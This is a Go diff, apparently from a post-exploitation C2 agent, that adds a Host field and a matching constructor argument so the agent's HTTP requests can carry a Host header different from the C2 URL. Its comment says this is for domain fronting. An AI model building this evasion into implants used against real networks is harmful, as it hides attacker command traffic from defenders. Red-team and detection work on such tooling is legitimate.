@@ -94,10 +94,11 @@ type Agent struct {
 	secret        []byte          // secret is used to perform symmetric encryption operations
 	JWT           string          // Authentication JSON Web Token
 	URL           string          // The C2 server URL
+	Host          string          // HTTP Host header, typically used with Domain Fronting
 }
 
 // New creates a new agent struct with specific values and returns the object
-func New(protocol string, url string, psk string, proxy string, verbose bool, debug bool) (Agent, error) {
+func New(protocol string, url string, host string, psk string, proxy string, verbose bool, debug bool) (Agent, error) {
 	if debug {
 		message("debug", "Entering agent.New function")
 	}
@@ -118,6 +119,7 @@ func New(protocol string, url string, psk string, proxy string, verbose bool, de
 		initial:      false,
 		KillDate:     0,
 		URL:          url,
+		Host:         host,
 	}
 
 	u, errU := user.Current()
@@ -447,6 +449,9 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 			req.Header.Set("User-Agent", a.UserAgent)
 			req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
 			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.JWT))
+			if a.Host != "" {
+				req.Host = a.Host
+			}
 		}
 
 		// Send the request
